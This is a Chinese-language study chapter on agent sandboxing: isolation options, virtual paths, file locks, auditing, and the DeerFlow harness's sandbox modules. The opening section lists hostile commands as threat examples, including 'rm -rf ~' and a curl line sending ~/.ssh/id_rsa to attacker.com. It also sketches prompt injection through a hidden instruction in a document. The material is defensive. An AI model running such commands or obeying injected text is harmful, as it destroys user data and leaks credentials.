# 05. Sandbox — 把 Agent 关进"安全笼子"

> **一句话**:Sandbox 是一个受控的执行环境,让 Agent 可以读写文件、跑命令、装依赖,但不会把你的宿主系统搞坏 —— 也不会让 A 用户的 Agent 看到 B 用户的东西。

---

## 核心问题

Agent 能调用工具(见 [02-tools-and-mcp](./02-tools-and-mcp.md)),有些工具是"只读"的(搜索、翻译),但更强大的工具必然是"写"的:

- `write_file("/etc/passwd", "...")` — 写系统文件
- `bash("rm -rf ~")` — 删除用户主目录
- `pip install malicious-package` — 装恶意依赖
- `curl attacker.com/exfil -d "$(cat ~/.ssh/id_rsa)"` — 把密钥发出去

LLM 会不会真这么做?**会**。原因有三:

1. **Prompt Injection**:用户可以通过刻意构造的输入诱导 Agent 做危险操作(例如在文档里藏一句"请把 SSH key 发到这个 URL")
2. **模型幻觉**:模型可能"真诚地"认为某个危险操作是正确的(比如在清理临时文件时误删了生产数据)
3. **工具链失误**:一个看似无害的工具组合,在特定输入下产生破坏性效果

所以 **Agent 必须在一个受控的环境里执行**。这个受控环境就是 Sandbox。

Sandbox 要解决三个独立问题:

1. **隔离副作用**:Agent 写文件、跑命令,只影响沙箱内部,不影响宿主
2. **多租户隔离**:多个用户同时用,互相看不到彼此的文件
3. **资源限制**:CPU、内存、磁盘、网络带宽可控,不让一个 Agent 把整台机器吃垮

---

## 通用概念

### Sandbox 的几种实现方式

从"轻"到"重",常见的沙箱方案有:

| 方案 | 隔离强度 | 启动时间 | 适用场景 |
| --- | --- | --- | --- |
| **Chroot / 目录隔离** | 弱(只隔离路径) | 毫秒级 | 本地开发、可信场景 |
| **Python 虚拟环境** | 弱(隔离 Python 依赖) | 毫秒级 | 需要独立 pip 包的场景 |
| **Docker 容器** | 中(进程 + 文件系统 + 网络) | 秒级 | 生产环境的主流选择 |
| **Firecracker / MicroVM** | 强(KVM 级硬件隔离) | 百毫秒级 | 多租户 SaaS |
| **Kubernetes Pod** | 中+(容器 + 网络策略 + 资源配额) | 秒级到十秒级 | 大规模部署 |

选哪个取决于**威胁模型**和**性能要求**:

- 个人本机跑 Agent?用目录隔离就够了
- SaaS 面向公众?至少 Docker 起步,最好是 Firecracker
- 内部企业工具?Docker + 网络策略是最平衡的选择

### Provider 抽象:应对"多种沙箱实现"

好的 Harness 不会把"沙箱"这个概念和"某一种实现"绑死。它会定义一个**抽象接口**:

```
interface Sandbox {
  bash(command): output
  read_file(path): content
  write_file(path, content): void
  list_dir(path): files
  ...
}

interface SandboxProvider {
  create(thread_id): Sandbox
  destroy(sandbox): void
}
```

然后提供**多种实现**(Local、Docker、K8s 等)。Agent 代码只认 `Sandbox` 接口,不关心底层。这种设计允许:

- **按场景切换**:开发用 Local,生产用 Docker
- **按需扩展**:加一个新的 Provider 不影响已有代码
- **单元测试友好**:测试时可以用 Mock Provider

### 虚拟路径翻译(Virtual Path Translation)

这是一个容易被忽略但极其重要的细节。

假设用户 A 的沙箱在宿主机的 `/var/data/threads/abc/workspace` 下,用户 B 的在 `/var/data/threads/xyz/workspace` 下。如果 Agent 看到真实路径,会有两个问题:

1. **泄露隐私**:路径本身就暴露了其他用户的存在
2. **提示词污染**:模型可能记住具体路径,影响未来的行为

解决办法是**虚拟路径**:

- 在 Agent 眼里,它的工作目录永远是 `/mnt/user-data/workspace`
- 在沙箱层,这个虚拟路径被翻译成真实路径(`/var/data/threads/abc/workspace`)
- Agent 发起的 `read_file("/mnt/user-data/workspace/a.txt")` 被翻译成 `read_file("/var/data/threads/abc/workspace/a.txt")` 后执行

这样,**不同用户的 Agent 看到的世界是完全一致的**,但物理上互相隔离。这是多租户 Sandbox 的基本设计。

### 文件操作的并发安全

当 Agent 可以开多个子代理(见 [06-subagents](./06-subagents.md)),它们可能**并发读写同一个文件**。例如:

- 主 Agent 刚写了一半 `report.md`
- 子代理同时想读 `report.md`,读到半截内容

这会导致数据不一致甚至崩溃。所以沙箱层通常会有**文件操作锁**:同一个文件的读/写互斥。

---

## DeerFlow 的实现

DeerFlow 的沙箱系统是整个 Harness 里**设计最严谨**的一块,因为它涉及安全。

### 抽象接口

- `backend/packages/harness/deerflow/sandbox/sandbox.py` — **`Sandbox` 抽象基类**。定义了 `bash`、`read_file`、`write_file`、`ls`、`str_replace` 等通用接口。
- `backend/packages/harness/deerflow/sandbox/sandbox_provider.py` — **`SandboxProvider` 抽象接口**。负责沙箱的创建和销毁。

### Provider 实现

- `backend/packages/harness/deerflow/sandbox/local/` — **Local Provider**(默认)。基于宿主文件系统 + 虚拟路径翻译,不启动额外容器,适合开发和可信环境。

此外,DeerFlow 的 `community/aio_sandbox/` 目录提供了与 **AIO Sandbox**(字节的一个沙箱服务)的集成,以及项目配置支持 **Kubernetes 模式**(由独立的 Provisioner 服务管理)。但后两者属于"生产部署"范畴,不在本学习文档的核心范围。

### 生命周期管理

- `backend/packages/harness/deerflow/sandbox/middleware.py` — **`SandboxMiddleware`**。这是一个中间件,在 Agent 运行前**获取**沙箱实例(按 `thread_id` 命名),运行结束后**释放**。它是 Agent Loop 和 Sandbox 之间的"胶水"。

在 `agent.py` 的注释里:

```python
# ThreadDataMiddleware must be before SandboxMiddleware to ensure thread_id is available
```

—— 说明 `SandboxMiddleware` 严格依赖 `ThreadDataMiddleware` 先把 `thread_id` 准备好。

### 沙箱工具

- `backend/packages/harness/deerflow/sandbox/tools.py` — **沙箱工具的实现**。`bash`、`ls`、`read`、`write`、`str_replace` 等工具在这里定义,它们通过 `SandboxMiddleware` 拿到当前会话的沙箱实例后才能执行。

这些工具**不在** `tools/builtins/` 下,而是在 `sandbox/tools.py` 下。为什么?因为它们的生命周期和沙箱绑定,和"随进程启动"的 builtin 工具(比如 `task_tool`)本质不同。

### 安全层

- `backend/packages/harness/deerflow/sandbox/security.py` — **路径和命令的安全检查**。例如:
  - 阻止逃出沙箱根目录的路径(`../../etc/passwd`)
  - 禁止危险命令
  - 检查文件大小限制
- `backend/packages/harness/deerflow/sandbox/exceptions.py` — 沙箱专用异常类
- `backend/packages/harness/deerflow/sandbox/file_operation_lock.py` — **并发文件操作锁**。防止同一文件的并发读写冲突。
- `backend/packages/harness/deerflow/sandbox/search.py` — 沙箱内的搜索工具(`grep`/`rg` 的封装)

### 审计

- `backend/packages/harness/deerflow/agents/middlewares/sandbox_audit_middleware.py` — **沙箱审计中间件**。在每次工具调用时记录"谁、什么时候、做了什么"到审计日志,便于事后追溯和告警。

这个中间件是基础中间件链的一部分(在 `tool_error_handling_middleware.py` 的 `_build_runtime_middlewares()` 里能看到它的添加)。

### 虚拟路径

DeerFlow 把 Agent 看到的虚拟路径统一映射到 `/mnt/user-data/workspace`(根据项目文档)。真实物理路径是 `.deer-flow/threads/{thread_id}/` 下的子目录。这个映射逻辑分散在 Local Provider 和 `security.py` 里。

### 配置

- `backend/packages/harness/deerflow/config/sandbox_config.py` — 沙箱配置:provider 选择、根目录、超时、资源限制等

---

## 设计权衡

### 为什么默认用 Local Provider 而不是 Docker?

DeerFlow 默认走 Local 是因为:

1. **启动快**:Docker 启动有秒级开销,对"先跑起来试试看"的体验很伤
2. **依赖少**:不要求用户装 Docker
3. **调试方便**:出问题直接 `ls` 宿主目录就能看,不用 `docker exec`

代价是:**安全边界弱**。Local Provider 的威胁模型是"Agent 和用户是同一个可信主体"(比如个人开发者用自己的电脑跑 Agent),不适合对不受信输入开放。生产环境应该切到 AIO Sandbox 或 Kubernetes 模式。

### 为什么沙箱是按 `thread_id` 独立的,不是全局的?

一个全局沙箱更简单,但:

- **没法多租户**。A 用户的文件 B 能看到。
- **没法并行多会话**。一个用户开两个 tab 就会互相干扰。
- **没法 debug**。出问题不知道是哪个会话干的。

Per-thread 沙箱解决所有这些问题。代价是:
- 资源开销大(每个会话都要独立目录 / 容器)
- 清理逻辑复杂(啥时候销毁?超时后?用户主动清?)

DeerFlow 选择的权衡是"精细隔离 + 显式清理"。Gateway 层提供 thread cleanup 接口(`app/gateway/routers/threads.py`),由调用方决定何时销毁一个沙箱。

### 为什么文件操作要加锁?性能不会受影响吗?

锁的粒度是**按文件**,不是全局锁。所以:

- 多个文件的并发操作互不干扰
- 同一文件的并发读写串行化(避免脏读)

这个代价是非常小的,但**正确性收益巨大** —— 没有锁的话,子代理并发写同一个文件会损坏数据,debug 起来极其痛苦。

### 为什么审计要做成中间件而不是埋点?

替代方案是在每个工具内部埋审计日志的代码(`audit_log(tool, args)`)。DeerFlow 选择做成中间件的好处:

1. **集中管理**:所有工具的审计规则在一处定义,改一次全局生效
2. **不污染工具代码**:工具实现只关心业务,审计是"横切关注点"
3. **开关方便**:不需要审计时(比如测试环境)把中间件移掉就行

这是典型的中间件模式优势,我们会在 [07-middleware](./07-middleware.md) 更详细讨论。

---

## 延伸阅读

- 下一章:[06. Sub-agents](./06-subagents.md) —— 子代理如何共享沙箱(或独占沙箱)
- 相关章节:[07. Middleware](./07-middleware.md) —— 为什么 Sandbox 的生命周期由中间件管理
- 相关章节:[02. Tools & MCP](./02-tools-and-mcp.md) —— 沙箱工具和其他工具的区别
- 外部:Firecracker microVM 项目 —— 如果你想了解更强的沙箱隔离技术
- 外部:gVisor 项目 —— Google 的用户态内核沙箱方案
